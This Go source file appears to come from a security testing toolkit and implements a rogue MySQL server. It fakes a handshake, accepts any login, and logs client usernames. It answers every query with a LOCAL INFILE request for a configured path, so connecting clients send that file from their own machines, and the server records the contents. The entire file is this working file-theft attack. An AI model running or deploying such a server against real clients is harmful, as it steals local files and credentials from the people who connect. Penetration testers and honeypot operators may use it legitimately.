package vsroguemysql

import (
	"bufio"
	"bytes"
	"encoding/binary"
	"fmt"
	"io"
	"log"
	"net"
	"reflect"
	"strings"
	"sync"

	"github.com/vikingo-project/vsat/events"
	"github.com/vikingo-project/vsat/files"
	"github.com/vikingo-project/vsat/models"
	"github.com/vikingo-project/vsat/utils"
)

type Server struct {
	listener net.Listener
	quit     chan interface{}
	wg       sync.WaitGroup
	API      *events.EventsAPI
	Settings settings // file on the target's system
}

func (s *Server) wrapConn(tcpConn net.Conn) *Session {
	c := new(Session)
	c.Conn = tcpConn
	c.reader = bufio.NewReader(tcpConn)
	c.FileData = new(bytes.Buffer)
	return c
}

func (s *Server) serve() {
	defer s.wg.Done()

	for {
		conn, err := s.listener.Accept()
		if err != nil {
			select {
			case <-s.quit:
				return
			default:
				log.Println("accept error", err)
			}
		} else {
			s.wg.Add(1)
			go func() {
				s.handleSession(s.wrapConn(conn))
				s.wg.Done()
			}()
		}
	}
}

func (s *Server) Stop() {
	close(s.quit)
	s.listener.Close()
	s.wg.Wait()
}

func readPacket(pktLen int, reader *bufio.Reader) ([]byte, error) {
	buff := make([]byte, 0, pktLen)
	n, err := reader.Read(buff)
	if err != nil {
		return buff, err
	}
	if pktLen == n {
		return buff, nil
	}

	// todo: check if packet bigger than 65kb
	for {
		tmp := make([]byte, pktLen-len(buff))
		n, err := reader.Read(tmp)
		if err != nil {
			if err != io.EOF {
				fmt.Println("read error:", err)
			}
			break
		}
		buff = append(buff, tmp[:n]...)
		if len(buff) == pktLen {
			break
		}
	}
	return buff, nil

}

func (s *Server) handleSession(sess *Session) {
	defer sess.Conn.Close()
	clientIP := utils.ExtractIP(sess.Conn.RemoteAddr().String())
	iSession, _ := s.API.NewSession(models.SessionInfo{
		Description: "connect",
		ClientIP:    clientIP,
		LocalAddr:   sess.Conn.LocalAddr().String(),
	})

	// send init packet
	packet, _ := newPacket(0, []byte("\x0a5.7.11-0ubuntuSatellite\x00\x2d\x00\x00\x00\x40\x3f\x59\x26\x4b\x2b\x34\x60\x00\xff\xf7\x08\x02\x00\x7f\x80\x15\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x68\x69\x59\x5f\x52\x5f\x63\x55\x60\x64\x53\x52\x00\x6d\x79\x73\x71\x6c\x5f\x6e\x61\x74\x69\x76\x65\x5f\x70\x61\x73\x73\x77\x6f\x72\x64\x00"))
	sess.Write(packet)

	sess.SetState("auth")
	pktHeader := make([]byte, 4)
	for {
		n, err := sess.reader.Read(pktHeader)
		if err != nil {
			utils.PrintDebug(err.Error())
			return
		}
		pktLen, _, _ := parsePacket(pktHeader[:n])
		if (pktLen > 0) || sess.GetState() == "file" { // if file in progress the pkt header.length can be zero
			pkt, err := readPacket(pktLen, sess.reader)
			if err != nil {
				log.Println(err)
				return
			}

			if sess.GetState() == "auth" {
				user, dbName := getUserCaps(pkt)
				fields := map[string]interface{}{
					"username": user,
				}
				if len(dbName) > 0 {
					fields["database"] = dbName
				}
				s.API.PushEvent(models.Event{Session: iSession, Name: "auth", Data: fields})
				packet, _ = newPacket(2, []byte("\x00\x00\x00\x02\x00\x00\x00")) // success auth
				sess.Conn.Write(packet)
				sess.SetState("any")
				continue
			} else if sess.GetState() == "any" {
				if len(pkt) > 0 {
					switch pkt[0] {
					case 0x01: // Quit
						sess.Conn.Close()
					case 0x02: // useDB
						utils.PrintDebug("use DB %s", string(pkt[1:]))
						packet, _ = newPacket(1, []byte("\x00\x00\x00\x02\x00\x00\x00"))
						sess.Conn.Write(packet)
					case 0x03: // query
						packet, _ = newPacket(1, append([]byte{0xFB}, []byte(s.Settings.FilePath)...))
						sess.SetState("file")
						sess.Conn.Write(packet)
					case 0x1b: // select db
						packet, _ = newPacket(1, []byte("\xfe\x00\x00\x02\x00"))
						sess.Conn.Write(packet)
					default:
						log.Printf("hz packet %x", pkt)
						packet, _ = newPacket(1, []byte("\x00\x00\x00\x02\x00\x00\x00"))
						sess.Conn.Write(packet)
					}
				} else {
					utils.PrintDebug("empty packet")
				}
			} else if sess.GetState() == "file" {
				if pktLen > 0 {
					sess.FileData.Write(pkt)
				} else {
					sess.SetState("any")
					f := files.PrepareFile(s.Settings.FilePath, sess.FileData.Bytes())
					if strings.Contains(f.ContentType, "text") && f.Size < 65536 {
						s.API.PushEvent(models.Event{Session: iSession, Name: "recv file", Data: map[string]interface{}{
							"content": string(f.Data),
						}})
					} else {
						s.API.PushEvent(models.Event{Session: iSession, Name: "recv file", Data: map[string]interface{}{
							"file": f,
						}})
					}
				}

			}

		}

	}
}

func newPacket(number int, data []byte) ([]byte, error) {
	packetHeader := new(bytes.Buffer)
	_plen := int32(len(data))
	var pl [3]byte
	pl[0], pl[1], pl[2] = byte(_plen), byte(_plen>>8), byte(_plen>>16) // packet length

	err := binary.Write(packetHeader, binary.LittleEndian, pl)
	if err != nil {
		return []byte{}, err
	}

	pnum := byte(number) // packet num
	err = binary.Write(packetHeader, binary.LittleEndian, pnum)
	if err != nil {
		return []byte{}, err
	}
	return append(packetHeader.Bytes(), data...), nil
}

func getUserCaps(data []byte) (username, db string) {
	// client capabilities... [2b]
	var skip = 0
	cCapabilities := data[skip : skip+2]
	skip += 2

	// extendedClientCapabilities := data[skip : skip+2]
	skip += 2

	// maxPacket := data[skip : skip+4]
	skip += 4

	// charset := data[skip : skip+1]
	skip++

	skip += 23 // magick

	nullByteIndex := bytes.IndexByte(data[skip:], 0x00)
	username = string(data[skip : skip+nullByteIndex])
	skip += len(username) + 1 // user len

	passlen := uint(data[skip])
	skip++
	password := data[skip : skip+int(passlen)]
	skip += len(password)

	cCapabilitiesUint16 := uint16(cCapabilities[0]) | uint16(cCapabilities[1])<<8
	clCap := getClientCaps(cCapabilitiesUint16)

	if clCap.ConnectWithDatabase {
		nullByteIndex = bytes.IndexByte(data[skip:], 0x00)
		db = string(data[skip : skip+nullByteIndex])
		skip += nullByteIndex
	}
	return
}

func getClientCaps(input uint16) ClientCapabilities {
	var cc ClientCapabilities
	for i := uint16(0); i < 16; i++ {
		if (input & (1 << i) >> i) == 1 {
			reflect.ValueOf(&cc).Elem().Field(int(i)).SetBool(true)
		}
	}
	return cc
}

func parsePacket(data []byte) (int, int, error) {
	hdr := data[0:4]
	packetLength := uint32(hdr[0]) | uint32(hdr[1])<<8 | uint32(hdr[2])<<16
	packetNum := uint8(hdr[3])
	return int(packetLength), int(packetNum), nil
}
